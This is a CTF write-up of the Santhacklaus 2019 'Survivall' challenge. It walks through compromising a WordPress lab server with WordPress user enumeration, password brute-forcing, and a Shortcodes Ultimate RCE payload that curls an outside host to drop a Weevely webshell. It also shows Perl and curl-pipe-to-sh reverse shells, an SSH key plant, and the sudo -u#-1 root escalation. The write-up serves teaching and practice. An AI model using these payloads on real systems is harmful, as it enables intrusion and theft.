+++
categories = ["Writeups", "CTF", "Santhacklaus-2019", "Web", "System"]
date = "2019-12-23"
title = "[CTF - Santhacklaus-2019] Survivall"
subtitle = "The best survival tech & guide !"
thumbnail = "/img/santhacklaus-2019/logo.jpg"
nopaging = "true"
+++

Survive all was a challenge proposed during the Santhacklaus CTF 2019. It was one of the hardest challenge of the competiton. Only one objective : obtain a root access.

![](/img/santhacklaus-2019/screen-0.png)

## Step 1 : Perimeter discovery

### 1.1. Services

We started this challenge with a classical services recon.

```md
PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd 2.4.38
| http-methods: 
|_  Supported Methods: HEAD
|_http-title: Survive All The best survival tech guide
Service Info: Host: 172.20.0.3
```

2 ports seems available :

- Closed TCP/22 which run SSH service
- Open TCP/80 which run HTTP service

No UDP ports have been detected.

### 1.2. Web scanning

The first step on the web application was to discover the technology used by the application. In this case, the browser extension Wappalyser give us somes informations. The application seem to be a Worpress running in 5.2.4 version with a WooCommerce plugin.

![](/img/santhacklaus-2019/screen-0-5.png)

{{< warning "Wappalyser is a usefull extension. Nevertheless, the extension send anonymous report with your analysed contents. Be carefull ! You can easily disable this feature under extension menu." >}}


![](/img/santhacklaus-2019/wappalyzer.png)


It's possible to obtain many informations with the public tool **Wpscan**.

```md
[+] http://survive-all.santhacklaus.xyz/
 | Interesting Entries:
 |  - Server: Apache/2.4.38 (Debian)
 |  - X-Powered-By: PHP/7.3.12
 |
[+] http://survive-all.santhacklaus.xyz/xmlrpc.php
 |
[+] http://survive-all.santhacklaus.xyz/readme.html
 |
[+] http://survive-all.santhacklaus.xyz/wp-cron.php
 |
[+] woocommerce
 | Location: http://survive-all.santhacklaus.xyz/wp-content/plugins/woocommerce/
 | Last Updated: 2019-11-27T19:11:00.000Z
 | [!] The version is out of date, the latest version is 3.8.1
 | Version: 3.3.0 (100% confidence)
 |
[+] WordPress version 5.2.4 identified (Latest, released on 2019-10-14).
 | Found By: Rss Generator (Passive Detection) (http://survive-all.santhacklaus.xyz/?feed=rss2)
 |
[+] WordPress theme in use: hestia
 | Readme: http://survive-all.santhacklaus.xyz/wp-content/themes/hestia/readme.txt
 | [!] The version is out of date, the latest version is 2.5.5
 | Version: 2.5.4
 |
[i] User(s) Identified:
 |
[+] admin
[+] Gear Brills
[+] dike
[+] James Yestin
[+] Tim Corcoran
[+] tim-corcoran
[+] gear-brills
[+] steve-parker
[+] james-yestin
```

Severals informations have been revealed by the scanner :

- PHP version is available in the server header.
- `xmlrpc.php` file is available.
- Basic `readme.md` file is also available.
- Rss feed is present.
- Several users was found.
- File upload vulnerability affects this woocommerce plugin version but seem unexploitable :
    - https://www.pluginvulnerabilities.com/2017/04/20/arbitrary-file-upload-vulnerability-in-woocommerce-catalog-enquiry/
    - https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-woocommerce-catalog-enquiry-arbitrary-file-upload-3-0-0/

{{< protips "Xmlrpc engine is really usefull in wordpress compromission scenarios. This feature permits to performs heavy and quick credentials bruteforcing. Also, severals vulnerability affects this functionnality in older version." >}}

### 1.3. Plugins bruteforcing

During the tests, I was not really satisfied by the result found. So I launched a bruteforce attack with the following wordlist to obtained more plugins : http://hacks.rocks/wp-content/uploads/2018/02/wp-plugins.txt


```bash
[th1b4ud@th1b4ud-pc ~]$ ./wfuzz -w ~/dictionaries/wp-plugins.txt --hc 404 http://survive-all.santhacklaus.xyz/wp-content/plugins/FUZZ

===================================================================
ID           Response   Lines    Word     Chars       Payload                                            
===================================================================

000000071:   403        9 L      28 W     293 Ch      "akismet"                                          
000000564:   301        9 L      28 W     389 Ch      "import-users-from-csv-with-meta"                  
000000587:   301        9 L      28 W     365 Ch      "jetpack"                                          
000000654:   301        9 L      28 W     383 Ch      "mailchimp-for-woocommerce"                        
000000667:   301        9 L      28 W     371 Ch      "master-slider"                                    
000000701:   301        9 L      28 W     367 Ch      "ml-slider"                                        
000000944:   301        9 L      28 W     377 Ch      "shortcodes-ultimate"                              
000001003:   301        9 L      28 W     372 Ch      "smart-slider-3"                                   
000001093:   301        9 L      28 W     377 Ch      "themeisle-companion"                              
000001095:   301        9 L      28 W     372 Ch      "theme-my-login"                                   
000001216:   301        9 L      28 W     369 Ch      "woocommerce"                                      
000001252:   301        9 L      28 W     378 Ch      "woocommerce-services"                             
000001328:   301        9 L      28 W     370 Ch      "wpforms-lite"                                     
000001406:   301        9 L      28 W     369 Ch      "wp-rollback"                                      
```

Great ! It's better. Theses plugins have been checked later.

### 1.4. Account informations gathering

A page on the application indicated somes usernames.

![](/img/santhacklaus-2019/screen-5-5.png)

A other page indicated that partner of survive-all are _cuttingedge_ and _flyingeagle_ company. The page also gave us an email format (for account bruteforce ?).

```md
For our partners cuttingedge.com and flyringeagle.com, don’t forget the contributor access we created for your members a while back. You can use your credentials to upload some valuable content on this platform 
```

![](/img/santhacklaus-2019/screen-5.png)


### 1.5. Default password

A page leaked informations about user credentials. Apparently, user password have the specific format : `@@MonthYear@@`

![](/img/santhacklaus-2019/screen-1.png)

http://survive-all.santhacklaus.xyz/?p=142




## Step 2 : Account compromission

### 2.1. Users enumeration

Wordpress is vulnerable by default to users enumeration. However, wordpress developers replied that this is not a vulnerability. Let's prove them wrong !

First, it was possible to obtaine wordpress current users with the API : http://survive-all.santhacklaus.xyz/index.php?rest_route=/wp/v2/users

{{< protips "Wordpress API is a gold mine of informations for pentester. Don't forget to add your X-WP-Nonce token in header HTTP query to obtains further informations." >}}

![](/img/santhacklaus-2019/screen-13.png)

![](/img/santhacklaus-2019/screen-14.png)

Also it was possible to abuse of the reset password functionnality to check if the account is available.

Here we can see that user `th1b4ud` was not available.

![](/img/santhacklaus-2019/screen-2.png)

However `admin` account was available.

![](/img/santhacklaus-2019/screen-3.png)


### 2.2. Valid email

With reference to informations previously obtained, we can bruteforce the application to obtain valid email.

![](/img/santhacklaus-2019/screen-5.png)

The email format to bruteforce was j.doe@cuttingedge.com and j.doe@flyingeagle.com.

![](/img/santhacklaus-2019/screen-6.png)

`admin@cuttingedge.com` was not a valid email.

![](/img/santhacklaus-2019/screen-7.png)
![](/img/santhacklaus-2019/screen-8.png)

However, with the username obtained by Wpscan we have obtained 2 valids address.

```
s.parker@cuttingedge.com
j.yestin@cuttingedge.com
```

### 2.3. Valid credentials

The login form was not protected against bruteforce attack. Then, we have bruteforced password for the emails previously obtained.

Here is a little python script to generate a nice wordlists.

```python
import datetime

for i in range(1,13):
    for j in range(2012, 2020):
        password = "@@" + datetime.date(2015, i, 1).strftime('%B')
        password += str(j) + "@@"
        print(password)
```

And Burp Pro intruder did all the work !

![](/img/santhacklaus-2019/screen-9.png)

This technique permited to found s.parker password.

`s.parker@cuttingedge.com:@@January2018@@`

{{< protips "If you don't have Burp Pro (humf huge mistake), you can abuse of xmlrpc mechanism to perform massive bruteforce attack with WPScan." >}}

```md
[th1b4ud@th1b4ud-pc]$ wpscan --url http://survive-all.santhacklaus.xyz -U "s.parker@cuttingedge.com" -P wordlist-pwd.txt

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - s.parker@cuttingedge.com / @@January2018@@
  
Trying s.parker@cuttingedge.com / @@January2019@@ Time: 00:00:00 - (10 / 10) 100.00% Time: 00:00:00

[i] Valid Combinations Found:
 | Username: s.parker@cuttingedge.com, Password: @@January2018@@
```

WPScan is really a nice tool !

![](/img/santhacklaus-2019/screen-10.png)

Theses credentials permitted to obtain an access as **Steve Parker**. This access also permitted to read the secret notes.

![](/img/santhacklaus-2019/screen-11.png)



## Step 3 : Plugin exploit

With the previous plugins list obtained with wfuzz, I checked all of them on google and one link appeared really interesting : https://wpvulndb.com/vulnerabilities/8945

`Shortcodes Ultimate <= 5.0.0 - Authenticated Contributor Code Execution`

The exploit is pretty simple. We tried it on a new article.

![](/img/santhacklaus-2019/screen-15.png)

Payload : 

```md
[su_meta key=1 post_id=1 default='curl http://1.2.3.4:4444/RCE!!!' filter='system']
```

![](/img/santhacklaus-2019/screen-16.png)

Perfect ! So beautiful ! The remote server reached our computer. Our commands have been correctly executed.


### 3.1. Webshell creation

The basic RCE was really unconfortable. So we've created a webshell with **Weevely** !

{{< protips "Weevely is a secured webshell designed for post-exploitation purposes. It's a tool naturally present on offensive distribution. More infos here : https://github.com/epinna/weevely3" >}}

If you haven't develop your own webshell, you can use Weevely webshell project. No more reason to use c99 malware shell PLEASE (yeah please no more of this s**t !!!) :(

```bash
[th1b4ud@th1b4ud-pc weevely3]$ ./weevely.py generate teachunbequatreude_password agent.php
Generated 'agent.php' with password 'teachunbequatreude_password' of 742 byte size.
```

We generated a webshell `agent.php` with password : `teachunbequatreude_password` (yeah I know it's a weak password, have you tried it on the CTFd platform ? :D). All we have to do is to upload it.

```md
[su_meta key=1 post_id=1 default='curl http://1.2.3.4:4444/agent.php -o wp-content/uploads/3e5t12e.php' filter='system']
```

![](/img/santhacklaus-2019/screen-16-4.png)

Done !

Weevely webshell is really simple to use.

```md
[th1b4ud@th1b4ud-pc weevely3]$ ./weevely.py http://survive-all.santhacklaus.xyz/wp-content/uploads/3e5t12e.php teachunbequatreude_password

[+] Weevely 3.7.0

[+] Target:	survive-all.santhacklaus.xyz
[+] Session:	/home/th1b4ud/.Weevely/sessions/survive-all.santhacklaus.xyz/3e5t12e_0.session

[+] Browse the filesystem or execute commands starts the connection
[+] to the target. Type :help for more information.

Weevely> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The power of this tool comes from all its features. On this challenge, normal reverse shell weren't working. With Weevely, you will not lost time to found a functionnal reverse shell : just use : `:backdoor_reversetcp` (yeah I know, this name s**k so much) :'(

![](/img/santhacklaus-2019/screen-16-4-5.png)

Weevely also have a module to enumerates suid/guid binaries to prepare your privilege escalation !

```md
www-data@081256f7edc3:/var/www/html/wp-content/uploads $ :audit_suidsgid /
+---------------------------------------------+
| /usr/bin/passwd                             |
| /usr/bin/gpasswd                            |
| /usr/bin/wall                               |
| /usr/bin/newgrp                             |
| /usr/bin/chage                              |
| /usr/bin/chsh                               |
| /usr/bin/expiry                             |
| /usr/bin/chfn                               |
| /usr/bin/ssh-agent                          |
| /usr/local/share/fonts                      |
| /usr/local/bin/sudo                         |
| /usr/lib/dbus-1.0/dbus-daemon-launch-helper |
| /usr/lib/openssh/ssh-keysign                |
| /var/mail                                   |
| /var/local                                  |
| /bin/su                                     |
| /bin/umount                                 |
| /bin/mount                                  |
| /opt/gather_todos_wrapper                   |
| /sbin/unix_chkpwd                           |
+---------------------------------------------+
```


### 3.2. Bdd creds

With the RCE we was able to easily grab MySQL credentials from `wp-config.php` file.

```php
<?php
    // ** MySQL settings - You can get this info from your web host ** //
    /** The name of the database for WordPress */
    define( 'DB_NAME', 'wordpress');

    /** MySQL database username */
    define( 'DB_USER', 'wordpress');

    /** MySQL database password */
    define( 'DB_PASSWORD', '3m1n3m4EVERyoung1nM(y)<3');

    /** MySQL hostname */
    define( 'DB_HOST', 'db:3306');

    /** Database Charset to use in creating database tables. */
    define( 'DB_CHARSET', 'utf8');

    /** The Database Collate type. Don't change this if in doubt. */
    define( 'DB_COLLATE', '');
?>
```

Look at this l33t originality :D

### 3.3. Reverse shell

With Weevely, we successfully obtained a nice reverse shell. For the exercice, we also checked classics reverse shell payloads but  they weren't working. In the end we still managed to get a reverse shell with perl payload.

{{< protips "In the objective to optimise your post exploitation time, I advise you to use shell.now.sh, an automated reverse shell tool : https://github.com/lukechilds/reverse-shell" >}}

`shell.now.sh` is a reverse shell provider tool. It's really simple to use : `curl https://shell.now.sh/<IP>:<PORT> | sh`

Final paylod : `http://survive-all.santhacklaus.xyz/wp-content/uploads/3e5t12e.php?cmd=curl https://shell.now.sh/1.2.3.4:4444 | sh`


![](/img/santhacklaus-2019/screen-16-5.png)

If you are curious, here is the original payload :

```bash
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"1.2.3.4:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Step 4 : Privilege escalation

### 4.1. Informations gathering

At this, we were in possesion of a RCE with `www-data` user. The final objective of the challenge was to obtains root access.

{{< protips "Privilege escalation can be a really huge tasks if you are not well organized. Below, you will find some tools to help you in this tasks. My favorite tool is Gtfobins. This Github page reference usefull informations concerning privilege escalation with linux binaries. " >}}

Here is some usefull tools :

- Enumeration script : https://github.com/diego-treitos/linux-smart-enumeration/
- Other enumeration script : https://raw.githubusercontent.com/rebootuser/LinEnum/
- All you need to know about linux binaries exploitation : https://gtfobins.github.io

Here is a one liner to easily past during your penetration test :

```bash
curl "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -Lo lse.sh;chmod 700 lse.sh; ./lse.sh; curl "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" -Lo LinEnum.sh; chmod 700 LinEnum.sh; ./LinEnum.sh -r report.txt -e /var/tmp/ -t
```

In our privilege escalation researches, we localised strange binarie with setuid bit : `/opt/gather_todos_wrapper`.

```bash
www-data@081256f7edc3:/ $ find / -user root -perm -4000 -exec ls -ldb {} \;

-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 568032 Dec  5 09:10 /usr/local/bin/sudo
-rwsr-xr-- 1 root messagebus 51184 Jun  9  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 436552 Oct  6 18:18 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /bin/su
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /bin/umount
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /bin/mount
-rwsr-xr-x 1 root root 16672 Dec  5 09:11 /opt/gather_todos_wrapper
```

![](/img/santhacklaus-2019/screen-17.png)

This script permited to guess the account credentials `testaccount:testaccount`


### 4.2. Group privilege escalation

A classical `sudo -l` command permited to find sudo privilege of the `testaccount` user. This account were authorized to execute with `staffteam` group privilege any command.

```bash
www-data@081256f7edc3:/ $ echo testaccount | su - testaccount -c "sudo -l"
User testaccount may run the following commands on 6a7280b6ec79:
    (BASIC : staffteam) NOPASSWD: ALL
```

We opened an other shell with `staffteam` group privilege.


### 4.3. SSH activation

This account with `staffteam` group privilege have the permission to restart SSH service.

```bash
www-data@081256f7edc3:/ $ echo testaccount | su - testaccount -c "echo testaccount | sudo -g staffteam sudo -l"
User testaccount may run the following commands on 6a7280b6ec79:
    (ALL, !root) ALL
    (ALL) NOPASSWD: /etc/init.d/apache2 restart, /etc/init.d/ssh restart
    (BASIC : staffteam) NOPASSWD: ALL
```

```
www-data@081256f7edc3:/ $ echo testaccount | su - testaccount -c "echo testaccount | sudo -g staffteam sudo /etc/init.d/ssh restart"
```

Done !

### 4.4. SSH connexion

We dropped our SSH key in `.ssh/authorized_keys` and successfully obtained remote SSH connexion.

```
www-data@081256f7edc3:/ $ echo testaccount | su - testaccount -c "id; mkdir -p .ssh; ls -al /home/testaccount; echo 'ssh-rsa AAAAB3NzaC[...]QPAbT th1b4ud@th1b4ud-pc' >> /home/testaccount/.ssh/authorized_keys; ls -al .ssh"

uid=1000(testaccount) gid=1006(testaccount) groups=1006(testaccount),1005(survive-all)
total 36
drwxr-xr-x 1 testaccount testaccount 4096 Dec 21 23:39 .
drwxr-xr-x 1 root        root        4096 Dec  5 09:11 ..
-rw-r--r-- 1 testaccount testaccount  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 testaccount testaccount 3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 testaccount testaccount  807 Apr 18  2019 .profile
drwx------ 2 testaccount staffteam   4096 Dec 21 23:51 .ssh
-rw-rw-rw- 1 testaccount testaccount  180 Dec 21 23:18 .wget-hsts
-rw-r----- 1 testaccount testaccount   84 Dec  5 09:11 TODO.txt
total 12
drwx------ 2 testaccount staffteam   4096 Dec 21 23:55 .
drwxr-xr-x 1 testaccount testaccount 4096 Dec 21 23:39 ..
-rw-r--r-- 1 testaccount testaccount  400 Dec 21 23:55 authorized_keys
```

```bash
[th1b4ud@th1b4ud-pc ~]$ ssh testaccount@survive-all.santhacklaus.xyz

Linux 1788f40d5d0e 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
testaccount@1788f40d5d0e:~$ 
```

Nice ! TTY shell access !

### 4.5. Root privilege esacalation

The privilege `(ALL, !root) ALL` reffered for an early vulnerability end 2019 : https://www.exploit-db.com/exploits/47502. This exploit permited to obtain the final root access on the server.

```bash
testaccount@63f5721427e4:~$ sudo -u#-1 /bin/bash
Password:

root@63f5721427e4:/home/testaccount# id
uid=0(root) gid=1001(staffteam) groups=1001(staffteam) 

root@63f5721427e4:/home/testaccount# cat /root/flag.txt 
SANTA{W3ll_d0ne!!You_HAVE_w0n}
```

Tada ! A lovely challenge as usual ! :)

See you next year for the v3.

Th1b4ud